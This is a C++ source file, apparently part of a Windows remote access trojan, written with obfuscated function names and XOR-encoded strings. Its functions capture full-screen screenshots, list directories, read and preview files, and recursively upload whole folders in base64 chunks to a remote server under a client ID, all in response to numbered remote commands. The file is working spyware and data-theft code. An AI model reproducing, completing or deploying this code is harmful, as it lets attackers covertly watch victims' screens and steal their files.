#include "rw.h"
#include "mt.h"
#include "fb.h"
#include "kz.h"

static string zQ(const string& path) {
    size_t pos = path.find_last_of('.');
    if (pos == string::npos) return "";
    string ext = path.substr(pos);
    transform(ext.begin(), ext.end(), ext.begin(), ::tolower);
    return ext;
}

static bool zS(const string& ext) {
    static const vector<string> exts = {
        ".txt", ".log", ".ini", ".json", ".xml", ".csv", ".md", ".bat", ".cmd",
        ".ps1", ".cpp", ".c", ".h", ".hpp", ".js", ".ts", ".html", ".htm",
        ".css", ".php", ".py", ".java", ".go", ".rs", ".sql", ".yml", ".yaml"
    };
    return find(exts.begin(), exts.end(), ext) != exts.end();
}

static bool zT(const string& ext) {
    static const vector<string> exts = {
        ".jpg", ".jpeg", ".png", ".gif", ".bmp", ".webp"
    };
    return find(exts.begin(), exts.end(), ext) != exts.end();
}

static string zU(const string& ext) {
    if (ext == ".jpg" || ext == ".jpeg") return "image/jpeg";
    if (ext == ".png") return "image/png";
    if (ext == ".gif") return "image/gif";
    if (ext == ".bmp") return "image/bmp";
    if (ext == ".webp") return "image/webp";
    return "application/octet-stream";
}

static bool zV(const vector<char>& data, size_t count) {
    for (size_t i = 0; i < count; ++i) {
        unsigned char c = (unsigned char)data[i];
        if (c == 0) return false;
        if (c < 0x09) return false;
        if (c > 0x0D && c < 0x20) return false;
    }
    return true;
}

string zL() {
    HDC hdcScreen = GetDC(NULL);
    if (!hdcScreen) return "";
    HDC hdcMem = CreateCompatibleDC(hdcScreen);
    if (!hdcMem) {
        ReleaseDC(NULL, hdcScreen);
        return "";
    }
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, w, h);
    if (!hBitmap) {
        DeleteDC(hdcMem);
        ReleaseDC(NULL, hdcScreen);
        return "";
    }
    SelectObject(hdcMem, hBitmap);
    BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);

    Bitmap bitmap(hBitmap, NULL);
    if (!bitmap.GetWidth()) {
        DeleteObject(hBitmap);
        DeleteDC(hdcMem);
        ReleaseDC(NULL, hdcScreen);
        return "";
    }

    CLSID clsid = {};
    UINT numEncoders = 0, encSize = 0;
    GetImageEncodersSize(&numEncoders, &encSize);
    if (encSize == 0) {
        DeleteObject(hBitmap);
        DeleteDC(hdcMem);
        ReleaseDC(NULL, hdcScreen);
        return "";
    }
    ImageCodecInfo* encoders = (ImageCodecInfo*)malloc(encSize);
    if (!encoders) {
        DeleteObject(hBitmap);
        DeleteDC(hdcMem);
        ReleaseDC(NULL, hdcScreen);
        return "";
    }
    GetImageEncoders(numEncoders, encSize, encoders);
    bool found = false;
    for (UINT i = 0; i < numEncoders; i++) {
        if (wcscmp(encoders[i].MimeType, __ow(L"\x3c\x38\x34\x32\x30\x7a\x3f\x25\x30\x32",10).c_str()) == 0) {
            clsid = encoders[i].Clsid;
            found = true;
            break;
        }
    }
    free(encoders);
    if (!found) {
        DeleteObject(hBitmap);
        DeleteDC(hdcMem);
        ReleaseDC(NULL, hdcScreen);
        return "";
    }

    IStream* stream = NULL;
    if (FAILED(CreateStreamOnHGlobal(NULL, TRUE, &stream)) || !stream) {
        DeleteObject(hBitmap);
        DeleteDC(hdcMem);
        ReleaseDC(NULL, hdcScreen);
        return "";
    }
    if (bitmap.Save(stream, &clsid, NULL) != Ok) {
        stream->Release();
        DeleteObject(hBitmap);
        DeleteDC(hdcMem);
        ReleaseDC(NULL, hdcScreen);
        return "";
    }
    STATSTG stat;
    if (FAILED(stream->Stat(&stat, STATFLAG_NONAME)) || stat.cbSize.LowPart == 0) {
        stream->Release();
        DeleteObject(hBitmap);
        DeleteDC(hdcMem);
        ReleaseDC(NULL, hdcScreen);
        return "";
    }
    ULONG size = stat.cbSize.LowPart;
    vector<unsigned char> jpegData(size);
    LARGE_INTEGER zero = {};
    stream->Seek(zero, STREAM_SEEK_SET, NULL);
    stream->Read(jpegData.data(), size, NULL);
    stream->Release();

    DeleteObject(hBitmap);
    DeleteDC(hdcMem);
    ReleaseDC(NULL, hdcScreen);

    return zX(jpegData.data(), jpegData.size());
}

string zM(const string& path) {
    namespace fs = std::filesystem;
    using namespace std::chrono;
    wstring wpath = yB(path);
    error_code ec;
    if (!fs::exists(wpath, ec)) {
        return "{\"path\":\"" + zY(path) + "\",\"error\":\"path not found\",\"dirs\":[],\"files\":[]}";
    }
    if (!fs::is_directory(wpath, ec)) {
        return "{\"path\":\"" + zY(path) + "\",\"error\":\"not a directory\",\"dirs\":[],\"files\":[]}";
    }
    string result = "{\"path\":\"" + zY(path) + "\",\"dirs\":[";
    bool first = true;
    for (const auto& e : fs::directory_iterator(wpath, ec)) {
        if (ec) {
            return "{\"path\":\"" + zY(path) + "\",\"error\":\"access denied\",\"dirs\":[],\"files\":[]}";
        }
        wstring name = e.path().filename().wstring();
        if (name == L"." || name == L"..") continue;
        string name8 = yC(name);
        if (!first) result += ",";
        first = false;
        if (e.is_directory(ec)) {
            result += "\"" + zY(name8) + "\"";
        }
    }
    result += "],\"files\":[";
    first = true;
    for (const auto& e : fs::directory_iterator(wpath, ec)) {
        if (ec) {
            return "{\"path\":\"" + zY(path) + "\",\"error\":\"access denied\",\"dirs\":[],\"files\":[]}";
        }
        wstring name = e.path().filename().wstring();
        if (name == L"." || name == L"..") continue;
        string name8 = yC(name);
        if (e.is_directory(ec)) continue;
        if (!first) result += ",";
        first = false;
        result += "{\"name\":\"" + zY(name8) + "\"";
        error_code ec2;
        auto ft = fs::last_write_time(e.path(), ec2);
        auto dur = ft.time_since_epoch();
        seconds s = duration_cast<seconds>(dur);
        time_t t = s.count() - 11644473600LL;
        struct tm tm;
        localtime_s(&tm, &t);
        char tb[64];
        strftime(tb, sizeof(tb), "%Y-%m-%d %H:%M:%S", &tm);
        uintmax_t sz = e.file_size(ec2);
        result += ",\"size\":" + to_string((long long)sz);
        result += ",\"mtime\":\"" + string(tb) + "\"}";
    }
    result += "]}";
    return result;
}

string yT(const string& path) {
    return zM(path);
}

string zP(const string& path, int commandId) {
    namespace fs = std::filesystem;
    fs::path fp(yB(path));
    error_code ec;
    if (!fs::exists(fp, ec) || fs::is_directory(fp, ec)) {
        string result = "{\"error\":\"file not found\",\"path\":\"" + zY(path) + "\"}";
        zF(commandId, result);
        return result;
    }

    ifstream fin(fp, ios::binary);
    if (!fin) {
        string result = "{\"error\":\"open failed\",\"path\":\"" + zY(path) + "\"}";
        zF(commandId, result);
        return result;
    }

    fin.seekg(0, ios::end);
    long long fileSize = (long long)fin.tellg();
    fin.seekg(0, ios::beg);

    const size_t maxPreview = 262144;
    size_t readSize = (size_t)min<long long>(fileSize, (long long)maxPreview);
    vector<char> buf(readSize);
    if (readSize > 0) {
        fin.read(buf.data(), (streamsize)readSize);
        readSize = (size_t)fin.gcount();
        buf.resize(readSize);
    }
    fin.close();

    string ext = zQ(path);
    bool truncated = fileSize > (long long)readSize;
    string name = path.substr(path.find_last_of("\\/") == string::npos ? 0 : path.find_last_of("\\/") + 1);
    string result;

    if (zT(ext)) {
        string b64 = readSize ? zX((unsigned char*)buf.data(), readSize) : "";
        result = "{\"type\":\"file_preview\",\"kind\":\"image\",\"path\":\"" + zY(path)
            + "\",\"name\":\"" + zY(name)
            + "\",\"mime\":\"" + zU(ext)
            + "\",\"size\":" + to_string(fileSize)
            + ",\"truncated\":" + string(truncated ? "true" : "false")
            + ",\"encoding\":\"base64\",\"content\":\"" + b64 + "\"}";
    } else if (zS(ext) || zV(buf, readSize)) {
        string text(buf.begin(), buf.end());
        result = "{\"type\":\"file_preview\",\"kind\":\"text\",\"path\":\"" + zY(path)
            + "\",\"name\":\"" + zY(name)
            + "\",\"size\":" + to_string(fileSize)
            + ",\"truncated\":" + string(truncated ? "true" : "false")
            + ",\"encoding\":\"utf-8\",\"content\":\"" + zY(text) + "\"}";
    } else {
        string b64 = readSize ? zX((unsigned char*)buf.data(), readSize) : "";
        result = "{\"type\":\"file_preview\",\"kind\":\"binary\",\"path\":\"" + zY(path)
            + "\",\"name\":\"" + zY(name)
            + "\",\"size\":" + to_string(fileSize)
            + ",\"truncated\":" + string(truncated ? "true" : "false")
            + ",\"encoding\":\"base64\",\"content\":\"" + b64 + "\"}";
    }

    zF(commandId, result);
    return result;
}

string zN(const string& path, int commandId) {
    std::filesystem::path fp(yB(path));
    ifstream fin(fp, ios::binary);
    if (!fin) {
        zF(commandId, "{\"error\":\"file not found\",\"path\":\"" + zY(path) + "\"}");
        return "";
    }
    fin.seekg(0, ios::end);
    long long fileSize = (long long)fin.tellg();
    fin.seekg(0, ios::beg);
    int totalChunks = (int)((fileSize + yS - 1) / yS);
    if (totalChunks == 0) totalChunks = 1;

    zG(commandId, __o("\x31\x3a\x22\x3b\x39\x3a\x34\x31\x0a\x26\x21\x34\x27\x21",14), path, 0, totalChunks, to_string((long long)fileSize));

    vector<char> buf(yS);
    string fullB64;
    for (int i = 0; i < totalChunks; i++) {
        long long readSize = fileSize - (long long)fin.tellg();
        if (readSize > yS) readSize = yS;
        fin.read(buf.data(), readSize);
        string chunkB64 = zX((unsigned char*)buf.data(), (size_t)readSize);
        zG(commandId, __o("\x31\x3a\x22\x3b\x39\x3a\x34\x31\x0a\x36\x3d\x20\x3b\x3e",14), path, i, totalChunks, chunkB64);
        fullB64 += chunkB64;
        if (i % 10 == 0 || i == totalChunks - 1)
            hB(__o("\x31\x3a\x22\x3b\x39\x3a\x34\x31\x75\x25\x27\x3a\x32\x27\x30\x26\x26\x6f\x75",19) + to_string(i + 1) + "/" + to_string(totalChunks) + " chunks");
    }
    fin.close();

    hB(__o("\x31\x3a\x22\x3b\x39\x3a\x34\x31\x75\x36\x3a\x38\x25\x39\x30\x21\x30\x6f\x75",19) + path + " (" + to_string((long long)fileSize) + " bytes, " + to_string(totalChunks) + " chunks)");
    zG(commandId, __o("\x31\x3a\x22\x3b\x39\x3a\x34\x31\x0a\x36\x3a\x38\x25\x39\x30\x21\x30",17), path, totalChunks, totalChunks, "");
    string finalResult = "{\"path\":\"" + zY(path) + "\",\"content\":\"" + fullB64 + "\",\"size\":" + to_string((long long)fileSize) + ",\"chunks\":" + to_string(totalChunks) + "}";
    zF(commandId, finalResult);
    return finalResult;
}

void zB(const string& localPath, const string& savePath) {
    std::error_code ec;
    if (!std::filesystem::exists(std::filesystem::path(yB(localPath)), ec)) return;
    string b64 = zK(localPath);
    if (b64.empty()) return;
    string data = "{\"type\":\"file_upload\",\"client_id\":\"" + yN + "\",\"path\":\"" + zY(savePath) + "\",\"data\":\"" + b64 + "\",\"last\":true}";
    hA(yL, yM, yK, data);
    hB(__o("\x20\x25\x39\x3a\x34\x31\x30\x31\x75\x21\x3a\x75\x26\x30\x27\x23\x30\x27\x6f\x75",20) + savePath + " (" + to_string(b64.length()) + " b64 bytes)");
}

void zI(const wstring& dirPath, const wstring& basePath, vector<z1>& entries) {
    wstring searchPath = dirPath + L"\\*";
    WIN32_FIND_DATAW ffd;
    HANDLE hFind = FindFirstFileW(searchPath.c_str(), &ffd);
    if (hFind == INVALID_HANDLE_VALUE) return;
    do {
        wstring name(ffd.cFileName);
        if (name == L"." || name == L"..") continue;
        wstring yV = dirPath + L"\\" + name;
        string relPath = yC(name);
        if (basePath.length() < dirPath.length()) {
            wstring suffix = dirPath.substr(basePath.length());
            relPath = yC(suffix + L"\\" + name);
            if (relPath[0] == '\\' || relPath[0] == '/') relPath = relPath.substr(1);
        }
        if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            zI(yV, basePath, entries);
        } else {
            entries.push_back({yV, relPath});
        }
    } while (FindNextFileW(hFind, &ffd));
    FindClose(hFind);
}

string zA(const string& path, int commandId) {
    wstring wpath = yB(path);
    DWORD attr = GetFileAttributesW(wpath.c_str());
    if (attr == INVALID_FILE_ATTRIBUTES) {
        zF(commandId, "{\"error\":\"path not found\",\"path\":\"" + zY(path) + "\"}");
        return "";
    }

    int fileCount = 0;
    if (attr & FILE_ATTRIBUTE_DIRECTORY) {
        vector<z1> entries;
        zI(wpath, wpath, entries);
        for (auto& e : entries) {
            string localPath = yC(e.yV);
            zB(localPath, e.yI);
            fileCount++;
        }
        hB(__o("\x31\x3a\x22\x3b\x39\x3a\x34\x31\x75\x31\x3c\x27\x75\x21\x3a\x75\x26\x30\x27\x23\x30\x27\x6f\x75",24) + path + " (" + to_string(fileCount) + " files)");
        string result = "{\"type\":\"download_dir\",\"path\":\"" + zY(path) + "\",\"files\":" + to_string(fileCount) + "}";
        zF(commandId, result);
        return result;
    } else {
        string fileName = path.substr(path.find_last_of("\\/") + 1);
        zB(path, fileName);
        hB(__o("\x31\x3a\x22\x3b\x39\x3a\x34\x31\x75\x33\x3c\x39\x30\x75\x21\x3a\x75\x26\x30\x27\x23\x30\x27\x6f\x75",25) + path);
        string result = "{\"type\":\"download_file\",\"path\":\"" + zY(path) + "\",\"saved_as\":\"uploads/" + zY(yN) + "/" + zY(fileName) + "\"}";
        zF(commandId, result);
        return result;
    }
}
